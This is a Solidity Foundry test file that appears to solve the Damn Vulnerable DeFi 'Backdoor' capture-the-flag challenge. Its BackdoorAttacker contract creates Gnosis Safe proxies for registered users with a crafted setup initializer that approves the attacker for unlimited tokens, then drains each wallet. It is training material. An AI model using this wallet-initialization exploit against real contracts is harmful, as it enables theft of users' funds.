// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";

import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";

contract Backdoor is Test {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        BackdoorAttacker backdoorAttacker =
        new BackdoorAttacker(address(walletFactory), address(walletRegistry), address(masterCopy), address(dvt), users);
        backdoorAttacker.attack();
        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract BackdoorAttacker {
    address walletFactory;
    address walletRegistry;
    address masterCopy;
    address dvt;
    address[] users;
    address attacker;

    constructor(
        address walletFactory_,
        address walletRegistry_,
        address masterCopy_,
        address dvt_,
        address[] memory users_
    ) {
        walletFactory = walletFactory_;
        walletRegistry = walletRegistry_;
        masterCopy = masterCopy_;
        dvt = dvt_;
        users = users_;
        attacker = msg.sender;
    }

    function approve(address to, address token) public {
        DamnValuableToken(token).approve(to, type(uint256).max);
    }

    function attack() external {
        address[] memory owner = new address[](1);
        bytes memory initializer;

        for (uint256 i; i < users.length; i++) {
            owner[0] = users[i];

            initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owner,
                1,
                address(this),
                abi.encodeWithSignature("approve(address,address)", address(this), dvt),
                address(0),
                address(0),
                0,
                attacker
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
                masterCopy, initializer, i, WalletRegistry(walletRegistry)
            );

            DamnValuableToken(dvt).transferFrom(address(proxy), attacker, 10e18);
        }
    }
}
